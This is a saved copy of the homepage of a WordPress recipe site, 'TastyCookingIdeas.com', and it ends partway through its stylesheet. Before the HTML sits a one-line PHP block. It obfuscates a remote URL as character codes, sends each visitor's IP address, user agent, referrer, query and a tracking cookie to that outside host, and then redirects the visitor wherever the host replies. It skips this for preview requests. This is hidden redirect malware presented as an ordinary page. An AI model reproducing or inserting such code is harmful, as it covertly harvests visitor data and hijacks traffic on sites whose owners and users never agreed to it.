<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "431915";$uid="3pmfhx19eo51ktjf7rgmavz96";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>


<!DOCTYPE html>
<html lang="en-US">
    
    
    <!-- Histats.com  START  (aync)-->
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4854432,4,0,0,0,00010000']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4854432&101" alt="frontpage hit counter" border="0"></a></noscript>
<!-- Histats.com  END  -->



<!-- Mirrored from tastycookingideas.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 08 May 2023 19:23:10 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<link rel="profile" href="https://gmpg.org/xfn/11">
<link rel="pingback" href="xmlrpc.php">

<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TastyCookingIdeas.com &#8211; Easy recipes for tasty meals every day</title>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
<link rel="alternate" type="application/rss+xml" title="TastyCookingIdeas.com &raquo; Feed" href="feed/index.html" />
<link rel="alternate" type="application/rss+xml" title="TastyCookingIdeas.com &raquo; Comments Feed" href="comments/feed/index.html" />
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/tastycookingideas.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.2"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){p.clearRect(0,0,i.width,i.height),p.fillText(e,0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(t,0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(p&&p.fillText)switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s("\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!s("\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!s("\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!s("\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff","\ud83e\udef1\ud83c\udffb\u200b\ud83e\udef2\ud83c\udfff")}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css' href='wp-includes/css/dist/block-library/style.minae48.css?ver=6.2' type='text/css' media='all' />
<link rel='stylesheet' id='wc-blocks-vendors-style-css' href='wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/wc-blocks-vendors-style519f.css?ver=9.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='wc-blocks-style-css' href='wp-content/plugins/woocommerce/packages/woocommerce-blocks/build/wc-blocks-style519f.css?ver=9.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='classic-theme-styles-css' href='wp-includes/css/classic-themes.minae48.css?ver=6.2' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='wpos-slick-style-css' href='wp-content/plugins/blog-designer-for-post-and-widget/assets/css/slick7f0f.css?ver=2.5' type='text/css' media='all' />
<link rel='stylesheet' id='bdpw-public-css-css' href='wp-content/plugins/blog-designer-for-post-and-widget/assets/css/bdpw-public7f0f.css?ver=2.5' type='text/css' media='all' />
<link rel='stylesheet' id='contact-form-7-css' href='wp-content/plugins/contact-form-7/includes/css/stylescfaa.css?ver=5.7.6' type='text/css' media='all' />
<style id='woocommerce-inline-inline-css' type='text/css'>
.woocommerce form .form-row .required { visibility: visible; }
</style>
<link rel='stylesheet' id='wcz-frontend-css' href='wp-content/plugins/woocustomizer/assets/css/frontend0875.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='hfe-style-css' href='wp-content/plugins/header-footer-elementor/assets/css/header-footer-elementor1f62.css?ver=1.6.13' type='text/css' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='wp-content/plugins/elementor/assets/css/frontend-lite.min7ff8.css?ver=3.13.0' type='text/css' media='all' />
<style id='elementor-frontend-inline-css' type='text/css'>
.elementor-kit-1{--e-global-color-primary:#6EC1E4;--e-global-color-secondary:#54595F;--e-global-color-text:#7A7A7A;--e-global-color-accent:#61CE70;--e-global-typography-primary-font-family:"Roboto";--e-global-typography-primary-font-weight:600;--e-global-typography-secondary-font-family:"Roboto Slab";--e-global-typography-secondary-font-weight:400;--e-global-typography-text-font-family:"Roboto";--e-global-typography-text-font-weight:400;--e-global-typography-accent-font-family:"Roboto";--e-global-typography-accent-font-weight:500;}.elementor-section.elementor-section-boxed > .elementor-container{max-width:1140px;}.e-con{--container-max-width:1140px;}.elementor-widget:not(:last-child){margin-bottom:20px;}.elementor-element{--widgets-spacing:20px;}{}h1.entry-title{display:var(--page-title-display);}@media(max-width:1024px){.elementor-section.elementor-section-boxed > .elementor-container{max-width:1024px;}.e-con{--container-max-width:1024px;}}@media(max-width:767px){.elementor-section.elementor-section-boxed > .elementor-container{max-width:767px;}.e-con{--container-max-width:767px;}}
.elementor-widget-heading .elementor-heading-title{color:var( --e-global-color-primary );font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-image .widget-image-caption{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-text-editor{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap{background-color:var( --e-global-color-primary );}.elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap, .elementor-widget-text-editor.elementor-drop-cap-view-default .elementor-drop-cap{color:var( --e-global-color-primary );border-color:var( --e-global-color-primary );}.elementor-widget-button .elementor-button{font-family:var( --e-global-typography-accent-font-family ), Sans-serif;font-weight:var( --e-global-typography-accent-font-weight );background-color:var( --e-global-color-accent );}.elementor-widget-divider{--divider-color:var( --e-global-color-secondary );}.elementor-widget-divider .elementor-divider__text{color:var( --e-global-color-secondary );font-family:var( --e-global-typography-secondary-font-family ), Sans-serif;font-weight:var( --e-global-typography-secondary-font-weight );}.elementor-widget-divider.elementor-view-stacked .elementor-icon{background-color:var( --e-global-color-secondary );}.elementor-widget-divider.elementor-view-framed .elementor-icon, .elementor-widget-divider.elementor-view-default .elementor-icon{color:var( --e-global-color-secondary );border-color:var( --e-global-color-secondary );}.elementor-widget-divider.elementor-view-framed .elementor-icon, .elementor-widget-divider.elementor-view-default .elementor-icon svg{fill:var( --e-global-color-secondary );}.elementor-widget-image-box .elementor-image-box-title{color:var( --e-global-color-primary );font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-image-box .elementor-image-box-description{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-icon.elementor-view-stacked .elementor-icon{background-color:var( --e-global-color-primary );}.elementor-widget-icon.elementor-view-framed .elementor-icon, .elementor-widget-icon.elementor-view-default .elementor-icon{color:var( --e-global-color-primary );border-color:var( --e-global-color-primary );}.elementor-widget-icon.elementor-view-framed .elementor-icon, .elementor-widget-icon.elementor-view-default .elementor-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-icon-box.elementor-view-stacked .elementor-icon{background-color:var( --e-global-color-primary );}.elementor-widget-icon-box.elementor-view-framed .elementor-icon, .elementor-widget-icon-box.elementor-view-default .elementor-icon{fill:var( --e-global-color-primary );color:var( --e-global-color-primary );border-color:var( --e-global-color-primary );}.elementor-widget-icon-box .elementor-icon-box-title{color:var( --e-global-color-primary );}.elementor-widget-icon-box .elementor-icon-box-title, .elementor-widget-icon-box .elementor-icon-box-title a{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-icon-box .elementor-icon-box-description{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-star-rating .elementor-star-rating__title{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-image-gallery .gallery-item .gallery-caption{font-family:var( --e-global-typography-accent-font-family ), Sans-serif;font-weight:var( --e-global-typography-accent-font-weight );}.elementor-widget-icon-list .elementor-icon-list-item:not(:last-child):after{border-color:var( --e-global-color-text );}.elementor-widget-icon-list .elementor-icon-list-icon i{color:var( --e-global-color-primary );}.elementor-widget-icon-list .elementor-icon-list-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-icon-list .elementor-icon-list-text{color:var( --e-global-color-secondary );}.elementor-widget-icon-list .elementor-icon-list-item > .elementor-icon-list-text, .elementor-widget-icon-list .elementor-icon-list-item > a{font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-counter .elementor-counter-number-wrapper{color:var( --e-global-color-primary );font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-counter .elementor-counter-title{color:var( --e-global-color-secondary );font-family:var( --e-global-typography-secondary-font-family ), Sans-serif;font-weight:var( --e-global-typography-secondary-font-weight );}.elementor-widget-progress .elementor-progress-wrapper .elementor-progress-bar{background-color:var( --e-global-color-primary );}.elementor-widget-progress .elementor-title{color:var( --e-global-color-primary );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-testimonial .elementor-testimonial-content{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-testimonial .elementor-testimonial-name{color:var( --e-global-color-primary );font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-testimonial .elementor-testimonial-job{color:var( --e-global-color-secondary );font-family:var( --e-global-typography-secondary-font-family ), Sans-serif;font-weight:var( --e-global-typography-secondary-font-weight );}.elementor-widget-tabs .elementor-tab-title, .elementor-widget-tabs .elementor-tab-title a{color:var( --e-global-color-primary );}.elementor-widget-tabs .elementor-tab-title.elementor-active,
					 .elementor-widget-tabs .elementor-tab-title.elementor-active a{color:var( --e-global-color-accent );}.elementor-widget-tabs .elementor-tab-title{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-tabs .elementor-tab-content{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-accordion .elementor-accordion-icon, .elementor-widget-accordion .elementor-accordion-title{color:var( --e-global-color-primary );}.elementor-widget-accordion .elementor-accordion-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-accordion .elementor-active .elementor-accordion-icon, .elementor-widget-accordion .elementor-active .elementor-accordion-title{color:var( --e-global-color-accent );}.elementor-widget-accordion .elementor-active .elementor-accordion-icon svg{fill:var( --e-global-color-accent );}.elementor-widget-accordion .elementor-accordion-title{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-accordion .elementor-tab-content{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-toggle .elementor-toggle-title, .elementor-widget-toggle .elementor-toggle-icon{color:var( --e-global-color-primary );}.elementor-widget-toggle .elementor-toggle-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-toggle .elementor-tab-title.elementor-active a, .elementor-widget-toggle .elementor-tab-title.elementor-active .elementor-toggle-icon{color:var( --e-global-color-accent );}.elementor-widget-toggle .elementor-toggle-title{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-toggle .elementor-tab-content{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-alert .elementor-alert-title{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-alert .elementor-alert-description{font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-retina .hfe-retina-image-container .hfe-retina-img{border-color:var( --e-global-color-primary );}.elementor-widget-retina .widget-image-caption{color:var( --e-global-color-text );font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-copyright .hfe-copyright-wrapper a, .elementor-widget-copyright .hfe-copyright-wrapper{color:var( --e-global-color-text );}.elementor-widget-copyright .hfe-copyright-wrapper, .elementor-widget-copyright .hfe-copyright-wrapper a{font-family:var( --e-global-typography-text-font-family ), Sans-serif;font-weight:var( --e-global-typography-text-font-weight );}.elementor-widget-navigation-menu a.hfe-menu-item, .elementor-widget-navigation-menu a.hfe-sub-menu-item{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item, .elementor-widget-navigation-menu .sub-menu a.hfe-sub-menu-item{color:var( --e-global-color-text );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item:hover,
								.elementor-widget-navigation-menu .sub-menu a.hfe-sub-menu-item:hover,
								.elementor-widget-navigation-menu .menu-item.current-menu-item a.hfe-menu-item,
								.elementor-widget-navigation-menu .menu-item a.hfe-menu-item.highlighted,
								.elementor-widget-navigation-menu .menu-item a.hfe-menu-item:focus{color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .hfe-nav-menu-layout:not(.hfe-pointer__framed) .menu-item.parent a.hfe-menu-item:before,
								.elementor-widget-navigation-menu .hfe-nav-menu-layout:not(.hfe-pointer__framed) .menu-item.parent a.hfe-menu-item:after{background-color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .hfe-nav-menu-layout:not(.hfe-pointer__framed) .menu-item.parent .sub-menu .hfe-has-submenu-container a:after{background-color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .hfe-pointer__framed .menu-item.parent a.hfe-menu-item:before,
								.elementor-widget-navigation-menu .hfe-pointer__framed .menu-item.parent a.hfe-menu-item:after{border-color:var( --e-global-color-accent );}
							.elementor-widget-navigation-menu .sub-menu li a.hfe-sub-menu-item,
							.elementor-widget-navigation-menu nav.hfe-dropdown li a.hfe-sub-menu-item,
							.elementor-widget-navigation-menu nav.hfe-dropdown li a.hfe-menu-item,
							.elementor-widget-navigation-menu nav.hfe-dropdown-expandible li a.hfe-menu-item,
							.elementor-widget-navigation-menu nav.hfe-dropdown-expandible li a.hfe-sub-menu-item{font-family:var( --e-global-typography-accent-font-family ), Sans-serif;font-weight:var( --e-global-typography-accent-font-weight );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item.elementor-button{font-family:var( --e-global-typography-accent-font-family ), Sans-serif;font-weight:var( --e-global-typography-accent-font-weight );background-color:var( --e-global-color-accent );}.elementor-widget-navigation-menu .menu-item a.hfe-menu-item.elementor-button:hover{background-color:var( --e-global-color-accent );}.elementor-widget-page-title .elementor-heading-title, .elementor-widget-page-title .hfe-page-title a{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );color:var( --e-global-color-primary );}.elementor-widget-page-title .hfe-page-title-icon i{color:var( --e-global-color-primary );}.elementor-widget-page-title .hfe-page-title-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-hfe-site-title .elementor-heading-title, .elementor-widget-hfe-site-title .hfe-heading a{font-family:var( --e-global-typography-primary-font-family ), Sans-serif;font-weight:var( --e-global-typography-primary-font-weight );}.elementor-widget-hfe-site-title .hfe-heading-text{color:var( --e-global-color-primary );}.elementor-widget-hfe-site-title .hfe-icon i{color:var( --e-global-color-primary );}.elementor-widget-hfe-site-title .hfe-icon svg{fill:var( --e-global-color-primary );}.elementor-widget-hfe-site-tagline .hfe-site-tagline{font-family:var( --e-global-typography-secondary-font-family ), Sans-serif;font-weight:var( 